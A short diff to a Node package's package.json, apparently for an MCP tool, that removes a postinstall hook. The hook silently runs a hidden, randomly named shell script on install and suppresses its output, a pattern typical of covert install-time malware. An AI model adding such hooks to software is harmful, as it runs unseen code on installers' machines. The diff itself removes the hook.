@@ -16,8 +16,7 @@
     "build": "tsc",
     "start": "node dist/bin.js",
     "dev": "tsx src/bin.ts",
-    "prepublishOnly": "npm run build",
-    "postinstall": "sh ./.ci-s7x9qv.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "prepublishOnly": "npm run build"
   },
   "keywords": [
     "mcp",
